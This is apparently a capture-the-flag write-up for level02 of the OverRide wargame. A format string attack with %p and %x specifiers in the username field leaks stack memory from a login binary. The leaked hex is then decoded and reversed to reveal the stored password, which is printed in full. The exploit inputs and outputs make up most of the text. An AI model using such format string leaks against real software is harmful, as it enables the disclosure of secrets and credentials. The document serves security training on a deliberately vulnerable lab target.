# LEVEL2

```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password: AAAAAAAACCCCCCCC
*****************************************
0x7fffffffe4f0 (nil) 0x41 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x4141414141414141 0x4343434343434343 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) does not have access!
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
--[ Password: AAAAAAAABBBBBBBB
*****************************************
ffffe4f0 0 41 2a2a2a2a 2a2a2a2a ffffe6e8 f7ff9a08 41414141 42424242 0 0 0 0 0 0 0 does not have access!
level02@OverRide:~$ 
```


```
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password: *****************************************
0x7fffffffe4f0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x702520 (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```

```
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
```

use https://cryptii.com/pipes/hex-decoder

```
level02@OverRide:~$ echo "H3gPfK9M5J5hnGXs7zqCWNgXEAJ5as9QunPR47hH" | rev
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
